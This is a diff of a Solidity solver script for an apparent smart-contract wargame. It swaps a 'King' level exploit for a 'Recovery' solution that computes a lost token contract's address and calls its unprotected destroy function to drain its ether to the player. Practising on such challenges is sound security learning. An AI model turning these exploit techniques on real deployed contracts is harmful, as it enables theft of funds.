@@ -2,17 +2,16 @@
 pragma solidity ^0.8.13;
 
 import "./SolveLevelBase.sol";
-import "../src/interfaces/IKing.sol";
-import "../src/exploits/KingExploit.sol";
+import "../src/interfaces/ISimpleToken.sol";
 
-contract SolveLevel9 is SolveLevelBase {
+contract SolveLevel17 is SolveLevelBase {
     function getInstanceCreationData()
         internal
         pure
         override
         returns (address levelAddress, uint256 value)
     {
-        levelAddress = 0x27bC920e7C426500a0e7D63Bb037800A7288abC1;
+        levelAddress = 0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb;
         value = 0.001 ether;
     }
 
@@ -20,9 +19,7 @@ contract SolveLevel9 is SolveLevelBase {
         internal
         override
     {
-        IKing instance = IKing(payable(instanceAddress));
-
-        uint256 prize = instance.prize();
-        KingExploit exploit = new KingExploit{value: prize + 1}(instance);
+        address simpleTokenAddress = computeCreateAddress(instanceAddress, 1);
+        ISimpleToken(simpleTokenAddress).destroy(payable(player));
     }
 }
